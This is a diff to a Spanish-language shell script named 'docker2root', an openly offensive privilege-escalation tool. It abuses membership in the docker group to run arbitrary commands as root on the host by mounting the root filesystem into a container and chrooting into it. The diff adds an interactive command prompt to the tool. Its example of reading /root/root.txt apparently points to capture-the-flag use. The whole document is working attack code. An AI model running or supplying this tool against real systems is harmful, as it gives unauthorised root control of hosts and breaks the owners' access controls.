@@ -6,20 +6,18 @@
 # =========================================================
 #
 # Descripción:
-# Herramienta que permite ejecutar comandos sobre el host
-# mediante Docker si el usuario
+# Herramienta que permite ejecutar comandos sobre el host 
+# mediante Docker si el usuario 
 # pertenece al grupo docker, y ejecutarlos como root en ciertas 
 # condiciones.
 #
-# Uso:
-#   chmod +x docker2root
-#   ./docker2root <comando>
+# Modos:
 #
-# Ejemplos:
-#   ./docker2root id
-#   ./docker2root whoami
-#   ./docker2root ls /root
-#   ./docker2root cat /root/root.txt
+# 1. Comando directo:
+#    ./docker2root id
+#
+# 2. Modo interactivo:
+#    ./docker2root
 #
 # =========================================================
 
@@ -75,23 +73,6 @@ echo "[+] Acceso al daemon Docker confirmado."
 echo
 
 # ---------------------------------------------------------
-# Comprobar comando
-# ---------------------------------------------------------
-
-if [ $# -eq 0 ]; then
-    echo "[-] Debes indicar un comando."
-    echo
-    echo "Uso:"
-    echo "    $0 <comando>"
-    echo
-    echo "Ejemplos:"
-    echo "    $0 id"
-    echo "    $0 ls /root"
-    echo "    $0 cat /root/root.txt"
-    exit 1
-fi
-
-# ---------------------------------------------------------
 # Buscar imagen usable
 # ---------------------------------------------------------
 
@@ -127,21 +108,69 @@ echo
 
 echo "[+] Comprobando si chroot funciona..."
 
-docker run --rm -v /:/mnt "$IMAGE" chroot /mnt id >/dev/null 2>&1
-
-if [ $? -eq 0 ]; then
+if docker run --rm -v /:/mnt "$IMAGE" chroot /mnt id >/dev/null 2>&1; then
+    CHROOT_OK=true
     echo "[+] chroot funcional."
-    echo "[+] Ejecutando comando como root sobre el host:"
-    echo "    $*"
-    echo
-
-    docker run --rm -v /:/mnt "$IMAGE" chroot /mnt "$@"
-
+    echo "[+] Los comandos se ejecutarán sobre el host como root."
 else
+    CHROOT_OK=false
     echo "[!] chroot no funciona."
-    echo "[+] Ejecutando comando desde el contenedor con el host montado en /mnt:"
-    echo "    $*"
+    echo "[+] Los comandos se ejecutarán con el host montado en /mnt."
+fi
+
+echo
+
+# ---------------------------------------------------------
+# Función de ejecución
+# ---------------------------------------------------------
+
+ejecutar_comando() {
+
+    CMD="$1"
+
+    echo
+    echo "[+] Ejecutando:"
+    echo "    $CMD"
     echo
 
-    docker run --rm -v /:/mnt "$IMAGE" "$@"
+    if [ "$CHROOT_OK" = true ]; then
+        docker run --rm -v /:/mnt "$IMAGE" chroot /mnt /bin/sh -c "$CMD"
+    else
+        docker run --rm -v /:/mnt "$IMAGE" /bin/sh -c "$CMD"
+    fi
+
+    echo
+}
+
+# ---------------------------------------------------------
+# Modo comando directo
+# ---------------------------------------------------------
+
+if [ $# -gt 0 ]; then
+    ejecutar_comando "$*"
+    exit 0
 fi
+
+# ---------------------------------------------------------
+# Modo interactivo
+# ---------------------------------------------------------
+
+echo "[+] Modo interactivo iniciado."
+echo "[+] Escribe 'exit' para salir."
+echo
+
+while true; do
+
+    printf "docker2root> "
+
+    read -r CMD
+
+    [ "$CMD" = "exit" ] && break
+    [ -z "$CMD" ] && continue
+
+    ejecutar_comando "$CMD"
+
+done
+
+echo
+echo "[+] Saliendo..."
